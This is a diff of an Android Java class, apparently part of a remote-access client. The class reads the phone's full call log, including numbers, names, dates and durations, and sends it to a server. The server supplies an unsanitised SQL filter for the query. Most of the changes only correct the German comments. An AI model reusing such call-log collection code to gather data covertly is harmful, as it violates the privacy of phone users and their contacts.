@@ -18,13 +18,13 @@ public class CallLogLister {
 	 * Diese Methode liest die Anruflisten aus und speichert sie in einem Array, dass dann an den Server gesendet wird.
 	 * @param c	Das Client-Objekt welches diese Methode aufgerufen hat
 	 * @param channel Der Kanal zur Datenübertragung
-	 * @param args	Hierbei handelt es sich um eine Filter für die SQL-Abfrage. Es ist die Where-Bedingung
-	 * @return true wenn Anruflisten vorhanden, falls sonst
+	 * @param args	Hierbei handelt es sich um einen Filter für die SQL-Abfrage. Es ist die Where-Bedingung
+	 * @return true wenn Anruflisten vorhanden, false sonst.
 	 */
 	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
 		/**
 		 * ArrayList l  In dieser ArrayList werden die Daten der Anrufliste gespeichert.
-		 * Wurde die Liste erfolreich ausgelesen so wird es an den Server übermittelt.
+		 * Wurde die Liste erfolreich ausgelesen, wird es an den Server übermittelt.
 		 */
 		ArrayList<CallPacket> l = new ArrayList<CallPacket>();
 		/**
@@ -33,23 +33,20 @@ public class CallLogLister {
 		boolean ret =false;
 		/**
 		 * Das args-Array wird hier in der Variablen WHERE_CONDITION gespeichert.
-		 * Es handelt sich hierbei um den Filter den der Benutzer einstellen kann.
+		 * Es handelt sich hierbei um den Filter, den der Benutzer einstellen kann.
 		 * Es werden dann nur die Anrufe der Liste entnommen, auf welche die Bedingung zutrifft.
 		 */
 		String WHERE_CONDITION = new String(args);
 		/**
-		 * Die Ordnung nach der Sortiert wurde. In diesem Fall werden die Einträge absteigend sortiert.
+		 * Die Ordnung nach der sortiert wurde. In diesem Fall werden die Einträge absteigend sortiert.
 		 */
 		String SORT_ORDER = "date DESC";
-		/**
-		 * Alles Spalten die aus denen die Daten ausgelesen werden sollen.
-		 */
-		String[] column = { "_id", "type", "date", "duration", "number","name" ,"raw_contact_id" };
+		//String[] column = { "_id", "type", "date", "duration", "number","name" ,"raw_contact_id" };
 		/**
 		 * Der Contentresolver kann auf die Daten zugreifen. Es handelt sich hierbei um eine Art SQL-Aufruf.
-		 * Das Ergebnis wird in der Variablen cursor gespeicehrt
+		 * Das Ergebnis wird in der Variablen cursor gespeichert
 		 */
-		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, column , WHERE_CONDITION, null, SORT_ORDER);
+		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, WHERE_CONDITION, null, SORT_ORDER);
 
 		/**
 		 * Sollte der cursor nicht leer sein, so wird der cursor auf das erste Element gesetzt.
@@ -58,8 +55,7 @@ public class CallLogLister {
 	        cursor.moveToFirst();
 	        do{
 				/**
-				 * Wenn an der Stelle auch die Spalten vorhanden sind bzw. diese Anzahl der Spalten nicht null ist,
-				 * wird der Inhalt der verschiedenen Spalten in Variablen zwischen gespeichert.
+				 * Liest die Daten aus dem Cursor aus und speichert diese in Variablen.
 				 */
 	           if(cursor.getColumnCount() != 0) {
 	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
@@ -70,30 +66,30 @@ public class CallLogLister {
 	        	   String name = cursor.getString(cursor.getColumnIndex("name"));
 	        	   int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
 				   /**
-					* Am Ende wird ein neues CallPacket erstellt, mit den gerade erhaltenen Daten und dies der List l angehängt.
+					* Am Ende wird ein neues CallPacket, mit den gerade erhaltenen Daten,  erstelltund und dies der List l angehängt.
 					*/
 	        	   l.add(new CallPacket(id, type, date, duration, raw_contact_id, number, name));
 	           }
 	        }
 			/**
-			 * Dies wird solange getan bist es kein nächtes Element mehr gibt.
+			 * Dies wird solange getan bis es kein nächtes Element mehr gibt.
 			 */
 			while(cursor.moveToNext());
 			/**
-			 * Soblad die Liste 2 Elemente enthält wird die Variable ret auf true gesetzt.
+			 * Soblad die Liste 2 Elemente enthält, wird die Variable ret auf true gesetzt.
 			 */
 	        ret = true;
         }
         else
 		/**
-		 * Sollte der cursor zu wenig Elemente enthalten so wird ret auf false gesetzt.
+		 * Sollte der cursor zu wenig Elemente enthalten, wird ret auf false gesetzt.
 		 */
         	ret = false;
 
 
 		/**
-		 * Mit Hilfe diesem aufruf werden die Daten an den Server geschickt.
-		 * Hierzu muss jedoch erst ain CallLogPacket erstellt werden.
+		 * Mit Hilfe dieses Aufrufs werden die Daten an den Server geschickt.
+		 * Hierzu muss jedoch erst ein CallLogPacket erstellt werden.
 		 */
 		c.handleData(channel, new CallLogPacket(l).build());
 		/**
